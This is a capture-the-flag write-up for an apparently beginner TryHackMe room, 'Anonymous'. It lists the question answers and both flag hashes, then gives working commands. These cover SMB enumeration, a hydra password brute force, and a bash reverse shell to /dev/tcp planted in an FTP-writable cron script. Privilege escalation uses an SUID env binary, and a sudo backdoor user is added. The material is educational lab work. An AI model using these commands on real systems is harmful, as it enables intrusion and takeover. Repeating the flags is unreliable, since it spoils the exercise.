Anonymous
#########
:Author: David Boyd
:Date: 2020-11-22

[Task 1] Pwn
************

Try to get the two flags!  Root the machine and prove your understanding of the
fundamentals! This is a virtual machine meant for beginners. Acquiring both
flags will require some basic knowledge of Linux and privilege escalation
methods.

For more information on Linux, check out `Learn Linux
<https://tryhackme.com/room/zthlinux>`_

Questions
=========

1. Enumerate the machine.  How many ports are open?
---------------------------------------------------
:Answer: 4

2. What service is running on port 21?
--------------------------------------
:Answer: FTP

3. What service is running on ports 139 and 445?
------------------------------------------------
:Answer: SMB

4. There's a share on the user's computer.  What's it called?
-------------------------------------------------------------
:Answer: pics

Walkthrough
^^^^^^^^^^^
:Reference: `SMB Enum Shares <https://bestestredteam.com/2019/03/15/using-smbclient-to-enumerate-shares/>`_

.. code-block:: Bash

	# enumerate SMB shares
	smbclient -L $TM

	# connect to share
	smbclient \\\\$TM\\pics

5. user.txt
-----------
:Answer: 90d6f992585815ff991e68748c414740
:Walkthrough: GOTO Reverse SHell

6. root.txt
-----------
:Answer: 4d930091c31a622a7ed10f27999af363
:Walkthrough: GOTO Privilege Escalation

Reconnaissance
**************

SMB Fun
=======

enum4linux
	a wrapper around the Samba tools: smbclinet, rpclient, net, and nmblookup.
	`enum4linux -A $TM` (Note: Does NOT identify vulns)

hydra
	`hydra -l namelessone -P /usr/share/wordlists/rockyou.txt smb -V -f -t 40`

nbtscan
	scan networks searching for NetBIOS information. `nbtscan $TM`

nmap scripts
	detect if SMB/Samba server is vulnerable to a RCE vuln. `nmap --script
	smb-vuln* -p 139,445 $TM` (Note: It's not; but there is a DOS)

nmblookup
	NetBIOS over TCP/IP client used to lookup NetBIOS names. `nmblookup -A $TM`

rpclient
	test MS-RPC functionality in Samba, manage Windows NT clients from UNIX
	workstations, and **open an authenticated SMB session w/ a NULL Session by
	entering username of ""**

.. code-block:: Bash

	# Connect to server
	rpcclient -U "" -N $TM
	# Enumerate users
	enumdomusers
		> user:[namelessone] rid:[0x3eb]
	# Query user to catch all kinds of information related to an individul user
	queryuser namelessone		# method 1
	queryuser 0x3eb      		# method 2

smbclient
	is a client that offers an interface similar to that of the FTP prgm that
	can 'talk' to an SMB/CIFS server.

.. code-block:: Bash

	# List shares
	smbclient -L $TM
	# Start smb session
	smbclient //$TM/<share>			# method 1
	smbclinet \\\\$TM\\<share>		# method 2

smbmap
	lists share drives, drive **permissions**, share contents, up/download
	functionality, file name auto-download pattern matching, and even execute
	remote commands.

.. code-block:: Bash

	smbmap -H $TM
	smbmap -H $TM -d <domainName(workgroup)> -u <userName> -p <password>

Reverse Shell
=============

.. code-block:: Bash

	## In FTP server
	ftp $TM 21			### NOTE: use 'lftp' from now on
	cd scripts
	get clean.sh				### NOTE: use 'lftp > edit'

	## In LHOST
	vim clean.sh
	# Replace then statement with reverse shell
	bash -i >& /dev/tcp/10.x.x.x/4444 0>&1
	# setup listener
	nc -nvlp 4444

	## In FTP server
	# Replace clean.sh with your reverse shell version
	put clean.sh

	## IN LHOST > nc
	# upgrade simple shell to a fully interactive ttys
	python -c 'import pty; pty.spawn("/bin/bash")'	# can be sketchy on this.$TM

	# GOTO CTF(1) user.txt

Privilege Escalation
====================

.. code-block:: Bash

	# Find our SUID files
	find / -perm /4000 2>/dev/null
		# files of particular interest
		/usr/bin/env

	# GOTO https://gtfobins.github.io/ -> env

	# Escalate Privs
	/usr/bin/env /bin/sh -p
	whoami

	# GOTO CTF(2) root.txt

Capture The Flag
================

.. code-block:: Bash

	# CTF(1) users.txt
	ls
	cat users.txt

	# CTF(2) root.txt
	find / -type f -name "root.txt" 2>/dev/null
	cat /root/root.txt

Other Fun Stuff
===============

useradd
-------
:Note: Doesn't work with cronjob script :(

.. code-block:: Bash

	# Add a user to sudoer group; password must be hashed!
	# useradd -g(roup) -p(assword-Hashed) <newUserName>
	sudo useradd -g sudo -p $( perl -e 'print crypt("student", "salt")') student

	perl -e 'print crypt("student", "salt")'
		> sa5hbTIQ04V26

lftp
----
:Purpose: You can use in-server editing of files!

lftp
	is a file transfer program that allows sophisticated FTP, HTTP and other
	connections to other hosts.

